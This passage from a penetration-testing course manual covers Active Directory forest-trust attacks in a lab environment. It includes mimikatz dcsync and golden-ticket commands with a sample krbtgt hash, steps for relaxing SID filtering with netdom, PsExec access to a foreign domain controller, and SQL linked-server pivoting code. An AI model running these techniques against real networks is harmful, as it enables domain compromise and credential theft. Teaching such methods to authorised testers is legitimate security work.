We now have the NTLM password hash of the root domain Administrator account and have 
obtained access to the Enterprise Admins group. Very nice. 
This section illustrated how dangerous unconstrained Kerberos delegation can be. In a worst-
case scenario, we could compromise the entire forest by just compromising one server or service 
account. 
In 2018, security researcher @harmj0y found that it is possible to trigger the print 
spooler authentication across a forest trust and obtain a forwardable TGT.997 
In 2019, Microsoft issued two rounds of security advisories and updates.998 The 
first blocked TGT delegation for all new forest trusts, while the second blocked it 
for existing forest trust as well. 
Also, bear in mind that if we obtain Domain Admin privileges in prod.corp1.com through some 
other vector, we could configure a server with unconstrained Kerberos delegation and use that to 
compromise any other domain in the forest. 
16.4.2.1 Exercises 
1. 
Abuse the print spool service on rdc01 and unconstrained Kerberos delegation on appsrv01 
to obtain the NTLM hash of the Enterprise Admins Administrator user. 
2. 
Complete the attack by getting code execution as the Administrator user on rdc01. 
16.5 Going Beyond the Forest 
The previous sections have clearly demonstrated that (as designed) no real security boundary 
exists between domains inside an Active Directory forest. However, since Microsoft envisions a 
security boundary between multiple forests, in the next sections we’ll discuss interforest trust and 
discuss both enumeration and potential exploitation vectors. 
 
997 (@harmj0y, 2018), https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/ 
998 (Microsoft, 2019), https://support.microsoft.com/en-us/help/4490425/updates-to-tgt-delegation-across-incoming-trusts-in-
windows-server 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
654 
16.5.1 
Active Directory Trust Between Forests 
In this module, we have focused on interdomain trust. In this section, we turn our attention to 
interforest trust. We will discuss the theory and highlight the differences between forest and 
domain trust. 
Figure 248 shows the trusts between Corp1.com and Corp2.com: 
 
Figure 248: Trust between forests 
In this forest trust, both forests trust the other. This is the most typical form of Active Directory 
forest trust. 
Like a domain trust, a forest trust can be one-way or bi-directional. The forest trust is transitive 
between domains, such that Dev.Corp1.com will trust Dev.Corp2.com but it is not transitive 
between multiple forests. If Corp2.com were to have a trust to an additional domain, namely 
Corp3.com, Corp1.com would not automatically have a trust to Corp3.com. 
Inside the forest, a shortcut trust can speed up the authentication process. Similarly, an external 
trust, like that shown in Figure 248, indicates a trust from a child domain inside one forest 
(Factory.Prod.Corp1.com) to a child domain inside another forest (Lab.Prod.Corp2.com). 
External trust is also non-transitive, which means if no forest trust exists between Corp1.com and 
Corp2.com, none of the domains except for Factory.Prod.Corp1.com and Lab.Prod.Corp2.com 
would have a trust relationship. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
655 
 
This concept extends to non-Windows environments as well. In a Kerberos Linux 
environment, a realm trust (which can either be transitive or non-transitive) 
describes a trust between an Active Directory forest and a Kerberos realm. 
Within an interforest trust, like the one used in our example, a user in a child domain like 
Prod.Corp1.com can perform queries and access resources in Prod.Corp2.com. We can also 
enumerate across the forest barrier and all information is public, but access to services depends 
on group membership. 
However, intraforest and interforest trust differ from an enumeration standpoint. The optional 
selective authentication999 setting limits access across a forest trust to only specific users against 
specific objects. 
In our example, any user in Prod.Corp1.com could perform queries on all Active Directory objects 
in Prod.Corp2.com, but if selective authentication is configured, a mapping is created that only 
allows selected users in Prod.Corp1.com to query information about specific objects in 
Prod.Corp2.com. 
This type of limitation will greatly reduce an attacker’s ability to enumerate the foreign forest, but 
at the same time, this configuration requires a great deal of design and administrative preparation 
so it is rarely implemented. 
Interforest trust is not uncommon and it’s important to understand how to leverage it during a 
penetration test. In the next section, we are going to perform enumeration of forest trust and of 
objects inside the foreign forest. 
16.5.2 
Enumeration Beyond the Forest 
In this section, we will focus on forest trust enumeration and we will perform enumeration from 
our current forest to users belonging to a trusted forest. 
The first enumeration step is to map out any forest trusts. This can be done easily with .NET 
through the Forest.GetAllTrustRelationships1000 method. 
In listing 849, we are enumerating from the perspective of the Offsec user from the 
prod.corp1.com domain. 
PS C:\tools> 
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRel
ationships() 
 
TopLevelNames            : {corp2.com} 
ExcludedTopLevelNames    : {} 
 
999 (Microsoft, 2014), https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-
2003/cc755321(v=ws.10)?redirectedfrom=MSDN 
1000 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.directoryservices.activedirectory.forest.getalltrustrelationships?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
656 
TrustedDomainInformation : {corp2.com} 
SourceName               : corp1.com 
TargetName               : corp2.com 
TrustType                : Forest 
TrustDirection           : Bidirectional 
Listing 849 - Enumerating forest trust 
We have located a bi-directional forest trust to corp2.com. We could also perform the 
enumeration with PowerView through the Get-ForestTrust method. 
If selective authentication is not enabled, we can enumerate trusts to child domains inside 
corp2.com with Get-DomainTrust by specifying the root domain and then continue with any 
discovered child domains. 
PS C:\tools> Get-DomainTrust -Domain corp1.com 
 
SourceName      : corp1.com 
TargetName      : prod.corp1.com 
TrustType       : WINDOWS_ACTIVE_DIRECTORY 
TrustAttributes : WITHIN_FOREST 
TrustDirection  : Bidirectional 
WhenCreated     : 4/2/2020 2:08:22 PM 
WhenChanged     : 4/2/2020 2:08:22 PM 
 
SourceName      : corp1.com 
TargetName      : corp2.com 
TrustType       : WINDOWS_ACTIVE_DIRECTORY 
TrustAttributes : FOREST_TRANSITIVE 
TrustDirection  : Bidirectional 
WhenCreated     : 4/2/2020 7:05:54 PM 
WhenChanged     : 4/17/2020 9:53:21 PM 
Listing 850 - Enumerating forest trust with LDAP 
The Get-DomainTrust LDAP query output reveals the trust relationships for the corp1.com 
domain. 
Given that manual enumeration of all domain and forest trusts is cumbersome in a large Active 
Directory infrastructure, we can use the PowerView Get-DomainTrustMapping method to 
automate the process: 
PS C:\tools> Get-DomainTrustMapping 
 
SourceName      : prod.corp1.com 
TargetName      : corp1.com 
TrustType       : WINDOWS_ACTIVE_DIRECTORY 
TrustAttributes : WITHIN_FOREST 
TrustDirection  : Bidirectional 
WhenCreated     : 4/2/2020 2:08:22 PM 
WhenChanged     : 4/2/2020 2:08:22 PM 
 
SourceName      : corp1.com 
TargetName      : prod.corp1.com 
TrustType       : WINDOWS_ACTIVE_DIRECTORY 
TrustAttributes : WITHIN_FOREST 
TrustDirection  : Bidirectional 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
657 
WhenCreated     : 4/2/2020 2:08:22 PM 
WhenChanged     : 4/2/2020 2:08:22 PM 
 
SourceName      : corp1.com 
TargetName      : corp2.com 
TrustType       : WINDOWS_ACTIVE_DIRECTORY 
TrustAttributes : FOREST_TRANSITIVE 
TrustDirection  : Bidirectional 
WhenCreated     : 4/2/2020 7:05:54 PM 
WhenChanged     : 4/2/2020 7:05:54 PM 
 
SourceName      : corp2.com 
TargetName      : corp1.com 
TrustType       : WINDOWS_ACTIVE_DIRECTORY 
TrustAttributes : FOREST_TRANSITIVE 
TrustDirection  : Bidirectional 
WhenCreated     : 4/2/2020 7:05:54 PM 
WhenChanged     : 4/2/2020 7:05:54 PM 
Listing 851 - Domain and forest trust mapping 
We could also use the BloodHound and SharpHound ingestors to perform full trust mapping, but 
regardless of our approach, our goal is to gather enough data to piece together a clear picture of 
the various trusts in use. 
Once we have completed our enumeration of forest trust and subsequent child domain trusts, we 
can start enumerating users, groups, and more in the trusted forest. 
Similar to our approach of enumerating trusted domains, we can begin this process with the .NET 
DirectorySearcher class, which accepts a trusted forest as a search area. 
Listing 852 shows truncated output from the enumeration of all users in corp2.com: 
PS C:\tools> Get-DomainUser -Domain corp2.com 
 
logoncount             : 12 
badpasswordtime        : 4/2/2020 12:01:00 PM 
description            : Built-in account for administering the computer/domain 
distinguishedname      : CN=Administrator,CN=Users,DC=corp2,DC=com 
objectclass            : {top, person, organizationalPerson, user} 
lastlogontimestamp     : 4/17/2020 12:19:58 PM 
name                   : Administrator 
objectsid              : S-1-5-21-4182647938-3943167060-1815963754-500 
samaccountname         : Administrator 
logonhours             : {255, 255, 255, 255...} 
admincount             : 1 
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=corp2,DC=com 
dscorepropagationdata  : {4/2/2020 2:19:32 PM, 4/2/2020 2:19:32 PM, 4/2/2020 2:04:22 
PM, 1/1/1601 6:12:16 PM} 
memberof               : {CN=Group Policy Creator Owners,CN=Users,DC=corp2,DC=com, 
CN=Domain 
                         Admins,CN=Users,DC=corp2,DC=com, CN=Enterprise 
Admins,CN=Users,DC=corp2,DC=com, CN=Schema 
                         Admins,CN=Users,DC=corp2,DC=com...} 
... 
Listing 852 - Enumerating all users in CORP2.COM 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
658 
While locating foreign high value targets is interesting, at this point we have no clear attack vector 
against them. One simple approach is to search for users with the same username in both 
forests as they might belong to the same employee. If such an account exists, there is a chance 
that the accounts share a password, which could grant us access. 
We could also attack foreign user accounts. For example, a user in prod.corp1.com may be a 
member of a group in corp2.com. This type of group membership is common as it is a simple 
way to grant access to resources. 
We can use the PowerView Get-DomainForeignGroupMember method to enumerate groups in a 
trusted forest or domain that contains non-native members. 
PS C:\tools> Get-DomainForeignGroupMember -Domain corp2.com 
 
GroupDomain             : corp2.com 
GroupName               : myGroup2 
GroupDistinguishedName  : CN=myGroup2,OU=corp2Groups,DC=corp2,DC=com 
MemberDomain            : corp2.com 
MemberName              : S-1-5-21-3776646582-2086779273-4091361643-1601 
MemberDistinguishedName : CN=S-1-5-21-3776646582-2086779273-4091361643-
1601,CN=ForeignSecurityPrincipals,DC=corp2,DC=com 
                           
PS C:\tools> convertfrom-sid S-1-5-21-3776646582-2086779273-4091361643-1601 
PROD\dave                           
Listing 853 - Enumerating foreign group membership 
Listing 853 reveals that the dave user from our current domain is a member of myGroup2 in 
corp2.com. 
Depending on the access rights associated with myGroup2, if we were to compromise the dave 
user in our current domain, we could easily gain access to corp2.com. 
16.5.2.1 Exercises 
1. 
Map out the domain and forest trust with PowerView. 
2. 
Repeat the enumeration of membership of users from our current forest inside corp2.com. 
3. 
Discover any groups inside our current forest that have members that originate from 
corp2.com. 
16.6 Compromising an Additional Forest 
Since Microsoft designed forest trust as a security boundary, by default it is not possible to 
compromise a trusted forest even if we have completely compromised our current forest. 
In the following sections, we’ll discuss attacks that will allow us to compromise a trusted forest 
under non-default (but not uncommon) conditions. 
16.6.1 
Show Me Your Extra SID 
When we escalated our access from prod.corp1.com to corp1.com, we abused the concept of 
ExtraSids, which allowed us to create a TGT that let us become members of the Enterprise 
Admins group. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
659 
In this section, we’ll revisit this technique and investigate how it applies to forest trust. 
Forest trust introduces the concept of SID filtering. In forest trust, the contents of the ExtraSids 
field are filtered so group memberships are not blindly trusted. 
For example, we could repeat our previous attack and generate a TGT in corp1.com with an 
ExtraSids entry claiming to be a member of the Enterprise Admins group in corp2.com. 
Once the TGT (now signed with the interforest trust key) reaches the domain controller in 
corp2.com, that ExtraSids entry is removed and a TGS is returned to us. This means that we 
should not be able to reuse our previous attack. 
Let’s test this in the labs by first obtaining the krbtgt password hash for the corp1.com domain. 
We log in to the Windows 10 client machine as the Offsec user and proceed to open a command 
prompt in the context of the Administrator user from the corp1.com domain to simulate complete 
forest compromise. 
Next, we’ll use mimikatz to trigger a domain controller replication with dcsync and obtain the 
krbtgt password hash of corp1.com: 
mimikatz # lsadump::dcsync /domain:corp1.com /user:corp1\krbtgt 
[DC] 'corp1.com' will be the domain 
[DC] 'RDC01.corp1.com' will be the DC server 
[DC] 'corp1\krbtgt' will be the user account 
 
Object RDN           : krbtgt 
 
** SAM ACCOUNT ** 
 
SAM Username         : krbtgt 
Account Type         : 30000000 ( USER_OBJECT ) 
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT ) 
Account expiration   : 
Password last change : 4/2/2020 6:47:04 AM 
Object Security ID   : S-1-5-21-1095350385-1831131555-2412080359-502 
Object Relative ID   : 502 
 
Credentials: 
  Hash NTLM: 22722f2e5074c2f03938f6ba2de5ae5c 
... 
Listing 854 - Obtaining krbtgt password hash 
To craft the golden ticket, we also need the SID of both the source and target domains. For this, 
we’ll again turn to PowerView: 
PS C:\tools> Get-DomainSID -domain corp1.com 
S-1-5-21-1095350385-1831131555-2412080359 
 
PS C:\tools> Get-DomainSID -domain corp2.com 
S-1-5-21-4182647938-3943167060-1815963754 
Listing 855 - Resolving domain SIDs 
Now we have all the information we need to create the golden ticket with the Enterprise Admins 
group listed as an ExtraSid: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
660 
mimikatz # kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1095350385-
1831131555-2412080359 /krbtgt:22722f2e5074c2f03938f6ba2de5ae5c /sids:S-1-5-21-
4182647938-3943167060-1815963754-519 /ptt 
 
User      : h4x 
Domain    : corp1.com (CORP1) 
SID       : S-1-5-21-1095350385-1831131555-2412080359 
User Id   : 500 
Groups Id : *513 512 520 518 519 
Extra SIDs: S-1-5-21-4182647938-3943167060-1815963754-519 ; 
ServiceKey: 22722f2e5074c2f03938f6ba2de5ae5c - rc4_hmac_nt 
Lifetime  : 4/18/2020 7:10:48 AM ; 4/16/2030 7:10:48 AM ; 4/16/2030 7:10:48 AM 
-> Ticket : ** Pass The Ticket ** 
 
 * PAC generated 
 * PAC signed 
 * EncTicketPart generated 
 * EncTicketPart encrypted 
 * KrbCred generated 
 
Golden ticket for 'h4x @ corp1.com' successfully submitted for current session 
Listing 856 - Creating a golden ticket with ExtraSid 
To verify if the golden ticket works, we’ll attempt to open a remote command prompt on 
dc01.corp2.com with PsExec: 
C:\tools> c:\tools\SysinternalsSuite\PsExec.exe \\dc01.corp2.com cmd 
... 
 
Couldn't access dc01.corp2.com: 
Access is denied. 
Listing 857 - Access denied on dc01.corp2.com 
Unfortunately, our golden ticket did not grant us Enterprise Admin access in corp2.com. This is 
due to SID filtering. 
Although the Active Directory Domains and Trusts administrative GUI does not show it, we can 
actually relax the SID filtering protection. 
We can use Netdom1001 on the domain controller that controls the incoming trust to allow SID 
history, which eases the strict SID filtering. 
Before we go any further, let’s take a moment to discuss why, exactly, anyone would reduce the 
security level and potentially allow compromise of one forest to affect another. 
As an example, imagine the “corp1” corporation acquires the “corp2” corporation. Both 
corporations have an existing Active Directory infrastructure that must now be merged. One way 
to do this is to move all users and services from corp2.com into corp1.com. 
User accounts are relatively easy to move but servers and services can be problematic. Because 
of this, it might be necessary to allow the migrated users access to services in their old forest. SID 
 
1001 (Microsoft, 2016), https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-
2012/cc772217(v=ws.11) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
661 
history was designed to address this, and during the migration period, corp2.com would disable 
SID filtering. 
In the real world, these kind of migrations tend to take multiple years or may 
never complete, leaving the forest trust with SID history enabled for an extended 
period of time. 
Before continuing, let’s display the attributes of the trust object so we can see how it would 
change after enabling SID history: 
PS C:\tools> Get-DomainTrust -Domain corp2.com 
 
SourceName      : corp1.com 
TargetName      : corp2.com 
TrustType       : WINDOWS_ACTIVE_DIRECTORY 
TrustAttributes : FOREST_TRANSITIVE 
TrustDirection  : Bidirectional 
WhenCreated     : 4/2/2020 7:05:54 PM 
WhenChanged     : 4/17/2020 9:38:08 PM 
Listing 858 - Forest trust information with SID filtering 
As we will discover, the interesting property in this output is TrustAttributes. 
To enable SID history, we’ll first log in to the domain controller of corp2.com as the Administrator 
user and open a command prompt. 
Next, we’ll use the trust subcommand of netdom and include the source domain, the target 
domain and the sid history setting (/enablesidhistory) to actually enable SID history. 
C:\Users\Administrator> netdom trust corp2.com /d:corp1.com /enablesidhistory:yes 
Enabling SID history for this trust. 
 
The command completed successfully. 
Listing 859 - Enable SID history in CORP2.COM 
With SID history enabled, we’ll again query for the trust object and note the contents of the 
TrustAttributes property: 
PS C:\tools> Get-DomainTrust -Domain corp2.com 
 
SourceName      : corp2.com 
TargetName      : corp1.com 
TrustType       : WINDOWS_ACTIVE_DIRECTORY 
TrustAttributes : TREAT_AS_EXTERNAL,FOREST_TRANSITIVE 
TrustDirection  : Bidirectional 
WhenCreated     : 4/2/2020 7:05:54 PM 
WhenChanged     : 4/18/2020 2:22:10 PM 
Listing 860 - Forest trust information without SID filtering 
In this output, the TREAT_AS_EXTERNAL value indicates that the forest trust is instead treated as 
an external trust but with the transitivity of normal forest trust. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
662 
Now we must determine if this allows us to add ourselves into the Enterprise Admins group of 
corp2.com and compromise the entire forest. 
We’ll regenerate our golden ticket with the same input as earlier: 
mimikatz # kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1095350385-
1831131555-2412080359 /krbtgt:22722f2e5074c2f03938f6ba2de5ae5c /sids:S-1-5-21-
4182647938-3943167060-1815963754-519 /ptt 
User      : h4x 
Domain    : corp1.com (CORP1) 
SID       : S-1-5-21-1095350385-1831131555-2412080359 
User Id   : 500 
Groups Id : *513 512 520 518 519 
Extra SIDs: S-1-5-21-4182647938-3943167060-1815963754-519 ; 
... 
Golden ticket for 'h4x @ corp1.com' successfully submitted for current session 
Listing 861 - Regenerating the golden ticket 
Now we’ll use that golden ticket to attempt code execution on dc01.corp2.com with PsExec: 
C:\tools> c:\tools\SysinternalsSuite\PsExec.exe \\dc01.corp2.com cmd 
... 
 
Couldn't access dc01.corp2.com: 
Access is denied. 
Listing 862 - Still access denied on dc01.corp2.com 
Unfortunately, we still do not have the ability to compromise the trusted forest. While we enabled 
SID history, SID filtering is still active. 
Microsoft dictated that any SID with a RID less than 1000 will always be filtered regardless of the 
SID history setting.1002 
However, a SID with a RID equal to or higher than 1000 is not filtered for external trust. When we 
queried the trust object after enabling SID history, we found that the forest trust is treated as an 
external trust. 
A non-default group will always have a RID equal to or higher than 1000. If we can find a custom 
group whose membership will allow us to compromise a user or computer, we can use that as an 
entry point. 
For example, let’s enumerate members of the corp2.com built-in Administrators group: 
PS C:\tools> Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com 
 
GroupDomain             : corp2.com 
GroupName               : Administrators 
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=corp2,DC=com 
MemberDomain            : corp2.com 
MemberName              : powerGroup 
MemberDistinguishedName : CN=powerGroup,OU=corp2Groups,DC=corp2,DC=com 
 
1002 (Microsoft, 2020), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-
103dd7c66280?redirectedfrom=MSDN 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
663 
MemberObjectClass       : group 
MemberSID               : S-1-5-21-4182647938-3943167060-1815963754-1106 
Listing 863 - Locating members of the builtin Administrators group 
The powerGroup is a member of the builtin Administrators group, which means it will grant local 
administrator access to the domain controller of corp2.com. In addition, the RID (1106) is higher 
than 1000. 
There is however another very important caveat. If the custom group we attempt to abuse is a 
member a global security group1003 like Domain Admins or Enterprise Admins, that access will 
also be filtered.1004 Only group membership in domain local security groups is not filtered. 
In our current example, the built-in Administrators group is a domain local group so we can 
leverage that to gain instant forest compromise. 
Let’s modify our golden ticket command to include the SID of powerGroup: 
mimikatz # kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1095350385-
1831131555-2412080359 /krbtgt:22722f2e5074c2f03938f6ba2de5ae5c /sids:S-1-5-21-
4182647938-3943167060-1815963754-1106 /ptt 
User      : h4x 
Domain    : corp1.com (CORP1) 
SID       : S-1-5-21-1095350385-1831131555-2412080359 
User Id   : 500 
Groups Id : *513 512 520 518 519 
Extra SIDs: S-1-5-21-4182647938-3943167060-1815963754-1106 ; 
... 
Golden ticket for 'h4x @ corp1.com' successfully submitted for current session 
Listing 864 - Golden ticket with superGroup in ExtraSids 
With the ticket crafted and loaded into memory, we’ll again attempt to gain access to 
dc01.corp2.com with PsExec: 
C:\tools> c:\tools\SysinternalsSuite\PsExec.exe \\dc01.corp2.com cmd 
... 
 
Microsoft Windows [Version 10.0.17763.737] 
(c) 2018 Microsoft Corporation. All rights reserved. 
 
C:\Windows\system32> whoami 
corp1\h4x 
Listing 865 - Obtaining access to DC01 with PsExec 
Finally. We’ve gained code execution inside corp2.com. Excellent! 
The example used in this section is rather simple but illustrates the point. Most often, this type of 
attack will not instantly lead to domain or forest compromise, but it is often possible to locate 
 
1003 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-
security-groups 
1004 (Dirk-jan Mollema, 2019), https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
664 
non-default groups with excessive DACL permissions, including prime targets such as Security 
groups for Microsoft Exchange.1005 
The design of SID filtering proves that forest trust is a security boundary that cannot be easily 
crossed. Even when SID history is enabled, compromise of the trusted forest is likely, but often 
not trivial. 
Throughout this section, we have focused on forest trust but when SID history is enabled, we are 
essentially dealing with external trust. This means that by default, external trust can be attacked 
through ExtraSids using groups with a RID equal to or higher than 1000. External trust does not 
provide transitivity but if the trusted domain is compromised, the entire forest is as well. 
SID filtering is an optional setting for external trusts and is known as SID filter 
quarantining. 
In this section, we investigated forest trust and demonstrated how it can be abused under certain 
conditions. This highlights the fact that as penetration testers, we should always check SID 
filtering when in environments that rely on forest trust. 
In the following two sections, we are going to investigate two additional techniques that can 
sometimes lead to compromise across forest trust. 
16.6.1.1 Exercises 
1. 
Enumerate the SID history setting for corp2.com. 
2. 
Attempt to gain code execution on dc01.corp2.com with a golden ticket. 
3. 
Enable SID history for corp2.com and enumerate its setting again. 
4. 
Obtain a reverse Meterpreter shell on dc01.corp2.com through the use of a golden ticket. 
5. 
Disable SID history again with netdom. 
16.6.2 
Linked SQL Servers in the Forest 
In a previous module, we demonstrated how linked SQL servers can be used to compromise 
additional SQL servers and if our privileges are high enough, the operating system itself. 
SQL servers themselves can also be linked across domain and even forest trust, which creates an 
interesting target opportunity. 
For example, a company might host a web server with an associated SQL server in the DMZ, but 
some queries may require access to data the company does not want to put directly into the 
DMZ. One solution would be to configure a link from the SQL server in the DMZ to the SQL server 
in the internal domain. 
 
1005 (Fox IT, 2018), https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
665 
To demonstrate this, we’ll first perform enumeration to locate any registered SPNs for MSSQL in 
prod.corp1.com: 
C:\tools> setspn -T prod -Q MSSQLSvc/* 
Checking domain DC=prod,DC=corp1,DC=com 
CN=SQLSvc,OU=prodUsers,DC=prod,DC=corp1,DC=com 
        MSSQLSvc/CDC01.prod.corp1.com:SQLEXPRESS 
        MSSQLSvc/cdc01.prod.corp1.com:1433 
 
Existing SPN found! 
Listing 866 - Locating MSSQL servers in PROD.CORP1.COM 
The existence of this SQL server is hardly a surprise since we already exploited it in a prior 
section. We can enumerate registered SPNs across domain trust as shown in Listing 867. 
C:\tools> setspn -T corp1 -Q MSSQLSvc/* 
Checking domain DC=corp1,DC=com 
CN=SQLSvc1,OU=corp1users,DC=corp1,DC=com 
        MSSQLSvc/rdc01.corp1.com:1433 
 
Existing SPN found! 
Listing 867 - Locating MSSQL servers in CORP1.COM 
This enumeration also works across forest trust and allows us to locate SPNs in corp2.com: 
C:\tools> setspn -T corp2.com -Q MSSQLSvc/* 
Checking domain DC=corp2,DC=com 
CN=SQLSvc2,OU=corp2users,DC=corp2,DC=com 
        MSSQLSvc/dc01.corp2.com:1433 
 
Existing SPN found! 
Listing 868 - Locating MSSQL servers in CORP2.COM 
We have located multiple MSSQL servers across both domains and forests. The next step is to 
attempt to log in to them. We already know that our user can perform a login to 
cdc01.prod.corp1.com, but our next targets are rdc01.corp1.com and dc01.corp2.com. 
First, we’ll attempt to log in to rdc01.corp1.com, reusing our existing tradecraft by updating the 
target server as shown in the partial code shown below: 
... 
String sqlServer = "rdc01.corp1.com"; 
String database = "master"; 
 
String conString = "Server = " + sqlServer + "; Database = " + database + "; 
Integrated Security = True;"; 
SqlConnection con = new SqlConnection(conString); 
... 
Listing 869 - Updating the target SQL server 
With the code compiled, we can perform a login and print out the login name along with member 
roles: 
C:\tools> \\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe 
Auth success! 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
666 
Connected to rdc01.corp1.com 
Logged in as: PROD\offsec 
User is a member of public role 
User is NOT a member of sysadmin role 
Listing 870 - Authentication to MSSQL server on RDC01.CORP1.COM 
Even though our user originates in prod.corp1.com, we can access the database in the parent 
domain. As expected, we only have unprivileged access. 
Next, we’ll attempt the same login to dc01.corp2.com: 
C:\tools> \\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe 
Auth success! 
Connected to dc01.corp2.com 
Logged in as: PROD\offsec 
User is a member of public role 
User is NOT a member of sysadmin role 
Listing 871 - Authentication to MSSQL server on DC01.CORP2.COM 
Once more, we obtain access to a MSSQL database, this time across the forest trust. If the 
database contains any misconfigurations, this could allow us to elevate privileges to sysadmin 
and compromise the operating system itself. 
Since the focus of this section is linked servers, we will use our developed tradecraft to 
enumerate linked servers through the sp_linkedservers stored procedure: 
... 
String execCmd = "EXEC sp_linkedservers;"; 
 
SqlCommand command = new SqlCommand(execCmd, con); 
SqlDataReader reader = command.ExecuteReader(); 
 
while (reader.Read()) 
{ 
  Console.WriteLine("Linked SQL server: " + reader[0]); 
} 
reader.Close(); 
... 
Listing 872 - Invoke sp_linkedservers to enumerate linked SQL servers 
Once the updated code is recompiled, we’ll execute it: 
C:\tools> \\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe 
Auth success! 
Linked SQL server: CDC01.PROD.CORP1.COM 
Linked SQL server: DC01.CORP2.COM 
Linked SQL server: RDC01\SQLEXPRESS 
Listing 873 - Linked SQL servers from RDC01.CORP1.COM 
The output shows that we have found a link to the MSSQL server in corp2.com. Now, we must 
determine the login context. 
We’ll again rely on our previously developed tradecraft: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
667 
C:\tools> \\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe 
Auth success! 
Executing as the login PROD\offsec on RDC01.CORP1.COM 
Executing as the login sa on DC01.CORP2.COM 
Listing 874 - Enumerating login context through link 
By following the link, we have obtained sa login context. This grants us code execution on the 
MSSQL server inside the trusted forest. Nice! 
Windows authentication to MSSQL is possible across both domain and forest trust and provides 
an attack surface that may break the security boundary. In addition, linked SQL servers provide 
another potential attack vector across both domain and forest trust. 
16.6.2.1 Exercises 
1. 
Repeat the enumeration of SPNs related to MSSQL along with the low privileged logins. 
2. 
Locate the link to dc01.corp2.com and leverage it to gain code execution inside corp2.com. 
16.6.2.2 Extra Mile 
Instead of logging in to the MSSQL server on rdc01.corp1.com, use the MSSQL server on 
cdc01.corp1.com instead and leverage SQL server links to get code execution on 
dc01.corp2.com. 
16.7 Wrapping Up 
In this module, we have delved into some of the most complex concepts of Active Directory and 
investigated what they mean for us as penetration testers. 
The design of an Active Directory infrastructure can lead to avenues of compromise that far 
exceed what some organizations believe possible. A forest is only as strong as its least secure 
domain and even the security boundary imposed by forest trust can be broken in some instances. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
668 
 
17 Combining the Pieces 
Throughout this course, we introduced various concepts and attack vectors and have used both 
existing and custom tools to exploit those vectors. In most of these scenarios, the exercises we 
completed were isolated. However, in a real-world penetration test we will often combine attacks 
and techniques, chaining them together while evading and bypassing antivirus and other 
protection mechanisms. 
In this module, we will walk through an attack against a network of machines, combining various 
attacks and techniques in a simulated penetration test. 
Before we begin, let’s reiterate some concepts as they apply to this module. 
We typically conduct a penetration test from either a completely external position, or from an 
assumed-breach vantage point. In the latter case, the penetration tester has been provided 
authenticated access to at least one system on the network. This is the primary approach we 
have adopted during this course. 
In a hybrid grey box approach, the penetration tester has access to limited 
information. An assumed breach test falls into this category. 
Since we have primarily executed assumed-breach tests in this course, in this module we will 
instead perform a simulated penetration test with no initial foothold as a starting point. 
Specifically, we will not have access to any information or authentication information as we 
approach the test. 
